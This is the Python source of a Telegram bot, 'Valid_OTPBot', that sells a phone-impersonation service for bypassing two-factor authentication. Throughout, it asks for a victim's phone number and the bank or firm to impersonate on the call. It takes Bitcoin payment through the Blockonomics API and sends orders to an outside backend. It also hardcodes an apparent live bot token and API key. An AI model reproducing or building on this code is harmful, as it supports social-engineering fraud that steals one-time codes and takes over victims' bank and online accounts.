from telegram import Update
from telegram.ext import Application,CommandHandler,MessageHandler,filters,ContextTypes, ConversationHandler,CallbackContext
import requests
import uuid
TOKEN='6700393132:AAEadQJxz1i-YovZANtrBTnmn6WNnXUwk0k'
BOTUSERNAME='@Valid_OTPBot'
LOGS_OTP_ADDRESS, GENERAL_OTP_PHONE, LOGS_OTP_NAME, GENERAL_OTP_NAME = range(4)
#Functions
def exchanged_rate(amount):
    url = "https://www.blockonomics.co/api/price?currency=USD"
    r = requests.get(url)
    response = r.json()
    return amount/response['price']
def get(amount):
    api_key = 'pj0LgQwm9o3gy8M2THSalKErb1poZlTKhQA1XYfpB4k'
    amount = float(amount)
    url = 'https://www.blockonomics.co/api/new_address'
    headers = {'Authorization': "Bearer " + api_key}
    r = requests.post(url, headers=headers)
    if r.status_code == 200:
        address = r.json()['address']
        bits = exchanged_rate(amount)
        return address
    else:
        return r

def handle_response(text: str) -> str:
    processed: str = text.lower()
    if '+' in processed:
        return 'number accepted'
    if processed:
        return 'Hey there!, type this /help to get tutorials on using this bot'

def handle_response_name(text: str) -> str:
    processed: str = text.lower()
    if processed:
        return f'{text} accepted'

def handle_response_normal(text: str) -> str:
    processed: str = text.lower()
    if processed:
        return 'Hey there!, type this /help to get tutorials on using this bot'

def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    update.message.reply_text('Operation cancelled.')
    return ConversationHandler.END
    
#Conversation functions.
async def logs_otp_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text
    text = handle_response(number)
    await update.message.reply_text(f'{number} accepted.')
    await update.message.reply_text("Enter Bank Name to be impersonated in call")
    if text == 'number accepted':
        
        order_id = uuid.uuid1()
        chat_id = update.message.chat.id
        data = {
            'chat_id': chat_id,
            'order_id': order_id,
            'number': number,
            'log': True
        }
        response = requests.post(url="https://achlive-api.vercel.app/pay/bot/create/", data=data)
        return LOGS_OTP_NAME
    else:
        print("Number not accepted, replying and continuing conversation.")
        await update.message.reply_text("Number not accepted. Please input a valid number starting with a +\neg(+1489977....)")
        return LOGS_OTP_ADDRESS

async def logs_otp_address_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text
    text = handle_response_name(name)

    if text:
        await update.message.reply_text(text)
        await update.message.reply_text("Generating address for you ......")
        addr = get(25)
        order_id = uuid.uuid1()
        chat_id = update.message.chat.id
        data = {
            'chat_id': chat_id,
            'order_id': order_id,
            'address': addr,
            'name': name
        }
        response = requests.post(url="https://achlive-api.vercel.app/pay/bot/create/", data=data)
        await update.message.reply_text(f'Your address is:\n###########################\n#{addr}\n#############################\nPay $25 into the address and wait for 3 confirmations. After 3 confirmations, you will receive a message soon. Thanks for using Valid_OTPBot!')
        print("Address generated, ending conversation.")
        return ConversationHandler.END
    else:
        print("Number not accepted, replying and continuing conversation.")
        await update.message.reply_text("Number not accepted. Please input a valid number starting with a +\neg(+1489977....)")
        return LOGS_OTP_NAME

async def general_otp_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text
    text = handle_response(number)

    if text == 'number accepted':
        await update.message.reply_text(f'{number} accepted.')
        await update.message.reply_text("Enter Firm Name to be impersonated in call")
        order_id = uuid.uuid1()
        chat_id = update.message.chat.id
        data = {
            'chat_id': chat_id,
            'order_id': order_id,
            'number': number,
            'log': True
        }
        response = requests.post(url="https://achlive-api.vercel.app/pay/bot/create/", data=data)
        print("Address generated, ending conversation.")
        return GENERAL_OTP_NAME
    else:
        print("Number not accepted, replying and continuing conversation.")
        await update.message.reply_text("Number not accepted. Please input a valid number starting with a +\neg(+1489977....)")
        return GENERAL_OTP_PHONE

async def general_otp_address_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text
    text = handle_response_name(name)
    
    if text:
        await update.message.reply_text(text)
        await update.message.reply_text("Generating address for you ......")
        addr = get(10)
        order_id = uuid.uuid1()
        chat_id = update.message.chat.id
        data = {
            'chat_id': chat_id,
            'order_id': order_id,
            'address': addr,
            'name': name
        }
        response = requests.post(url="https://achlive-api.vercel.app/pay/bot/create/", data=data)
        await update.message.reply_text(f'Your address is:\n###########################\n#{addr}\n#############################\nPay $10 into the address and wait for 3 confirmations. After 3 confirmations, you will receive a message soon. Thanks for using Valid_OTPBot!')
        print("Address generated, ending conversation.")
        return ConversationHandler.END
    else:
        print("Number not accepted, replying and continuing conversation.")
        await update.message.reply_text("Number not accepted. Please input a valid number starting with a +\neg(+1489977....)")
        return GENERAL_OTP_NAME
# commands
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    order_id = uuid.uuid1()
    chat_id = update.message.chat.id
    data = {
        'chat_id':chat_id,
        'order_id':order_id
    }
    response=requests.post(url="https://achlive-api.vercel.app/pay/bot/create/",data=data)
    await update.message.reply_text('Hello! Thanks for trusting Valid_OTPBot! Kindly tap on the menu to grab your otp codes or select /help to get tutorials on how this bot works.')
   
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    order_id = uuid.uuid1()
    chat_id = update.message.chat.id
    data = {
        'chat_id':chat_id,
        'order_id':order_id
    }
    response=requests.post(url="https://achlive-api.vercel.app/pay/bot/create/",data=data)
    await update.message.reply_text('Hello! Thanks for chatting with me!. Kindly tap on the *blue-highlighted* three lines at the left lower screen on your device\nselect LogsOTPbypass on the menu to get OTP code for any bank log with 2-Factor Authenticatication\nselect GeneralOTPbypass to get OTP code for any website requesting a 2-Factor Authentication')

async def LogsOTPbypass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Input victim's Phone Number starting with a +\neg(+1489977....)")
    return LOGS_OTP_ADDRESS

async def GeneralOTPbypass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Input victim's phone number starting with a +\neg(+1489977....)")
    return GENERAL_OTP_PHONE

async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')


async def handle_message(update: Update, context:ContextTypes.DEFAULT_TYPE):
    message_type: str = update.message.chat.type
    text: str = update.message.text
    chat_id: str = update.message.chat.id
    order_id = uuid.uuid1()
    chat_id = update.message.chat.id
    data = {
        'chat_id':chat_id,
        'order_id':order_id
    }
    response=requests.post(url="https://achlive-api.vercel.app/pay/bot/create/",data=data)
    print(chat_id)
    if message_type == 'group':
        if BOTUSERNAME in text:
            new_text: str = text.replace(BOTUSERNAME,'').strip()
            response: str = handle_response_normal(new_text)
        else:
            return
    else:
        response: str = handle_response_normal(text)
    
    await update.message.reply_text(response)

print('Starting bot...')
app= Application.builder().token(TOKEN).build()

#commands
app.add_handler(CommandHandler('start',start_command))
app.add_handler(CommandHandler('help',help_command))
#Conversation
conv_handler = ConversationHandler(
    entry_points=[
        CommandHandler('logsotpbypass', LogsOTPbypass),
        CommandHandler('generalotpbypass', GeneralOTPbypass)
    ],
    states={
    LOGS_OTP_ADDRESS: [MessageHandler(filters.TEXT, logs_otp_address)],
    GENERAL_OTP_PHONE: [MessageHandler(filters.TEXT, general_otp_phone)],
    LOGS_OTP_NAME : [MessageHandler(filters.TEXT, logs_otp_address_name)],
    GENERAL_OTP_NAME:[MessageHandler(filters.TEXT, general_otp_address_name)]
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

app.add_handler(conv_handler)
#Messages
app.add_handler(MessageHandler(filters.TEXT, handle_message))
#error
app.add_error_handler(error)
print('polling...')
app.run_polling(poll_interval=3)